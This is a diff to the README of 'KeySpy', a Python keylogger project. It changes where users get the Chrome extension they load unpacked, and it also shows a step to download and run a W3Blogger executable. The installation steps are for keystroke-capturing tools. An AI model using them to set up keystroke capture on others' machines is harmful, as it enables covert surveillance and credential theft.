@@ -45,7 +45,7 @@ KeySpy is a simple Python keylogger with a web interface for viewing captured ke
    - Open the Browser.
    - Search this link `chrome://extensions/`.
    - Click on `Load Unpack`.
-   - Add W3bSpy-Client folder from `./src/W3bSpy/W3bSpy-Client`
+   - Add .extn folder from `./.extn` from [WebSpy](https://github.com/3rr0r-505/WebSpy).
     
 ### 🌐Web Interface:
    - Install [W3Blogger.exe](https://github.com/3rr0r-505/KeySpy/raw/main/exe/W3Blogger/W3Blogger_v1.1.exe) and launch it.
